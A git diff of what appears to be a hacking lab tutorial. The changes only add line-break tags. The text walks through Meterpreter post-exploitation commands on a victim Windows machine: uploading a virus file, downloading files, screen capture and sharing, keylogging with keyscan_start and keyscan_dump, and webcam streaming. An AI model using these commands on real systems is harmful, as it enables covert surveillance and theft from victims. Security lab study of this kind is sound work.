@@ -332,39 +332,39 @@ We can even open the shell of the windows machine by just commanding: shell , in
 
 <h4> Scopes for hackers | Consequences for victims </h4>
 
-1.  View and upload files
+1.  View and upload files</br>
 
-    To view and surf through the machine and different directories. Popular commands are
+    To view and surf through the machine and different directories. Popular commands are</br>
 
-    cd: change directory
-    ls: list the contents of that particular directory
-    pwd: print working directory
+    cd: change directory</br>
+    ls: list the contents of that particular directory</br>
+    pwd: print working directory</br>
 
-    To upload files in the victim machine, we can simply use the upload command
-    upload /home/attacker/Desktop/virusnew.exe
+    To upload files in the victim machine, we can simply use the upload command</br>
+    upload /home/attacker/Desktop/virusnew.exe</br>
 
     This command will simply upload the virus.exe file from the attackers computer to the present working directory of the victim machine. Note that, attacker is the name of our attacker machine here in our example.
 
 
 
-2.  Download files from the victims computer.
+2.  Download files from the victims computer.</br>
     We can use download command to download a file from the victim machine. And cat command to open it.
 
 
 3.  Viewing the screen
-    By doing the command:
-    screenshot -v true
+    By doing the command:</br>
+    screenshot -v true</br>
     screenshot of the current screen of the victim window can be taken. A popup will come in front.
-    Even we can continously watch the screen by the command:
-    screenshare
+    Even we can continously watch the screen by the command:</br>
+    screenshare</br>
     a player will start and screen will get shared.
 
 
-4.  Keystrokes logging
-    To start recording the key strokes, the command is:
-    keyscan_start
-    and to dump the recorded commands so far:
-    keyscan_dump
+4.  Keystrokes logging</br>
+    To start recording the key strokes, the command is:</br>
+    keyscan_start</br>
+    and to dump the recorded commands so far:</br>
+    keyscan_dump</br>
     In the dump <cr> refers to carriage return or it is the enter key pressed.
 
 
@@ -372,12 +372,12 @@ We can even open the shell of the windows machine by just commanding: shell , in
     For this lab project, we need to give access to the camera for our virtual machine. To do that, we need to go to Machine>Settings>Ports. Select USB and checkbox enable USB Controller. Restart the VM, turn off the defenders and go to Devices>Webcams and select the name of webcam.
 
 
-    Now, we can spy through the webcam with the following commands in meterpreter.
+    Now, we can spy through the webcam with the following commands in meterpreter.</br>
 
-    Command: webcam_list
+    Command: webcam_list</br>
     this will show the available webcam on that machine.
-    We just need to type this command to open and view the webcam.
-    Command:  webcam_stream
+    We just need to type this command to open and view the webcam.</br>
+    Command:  webcam_stream</br>
 
     meterpreter will open the firefox and stream video.
 
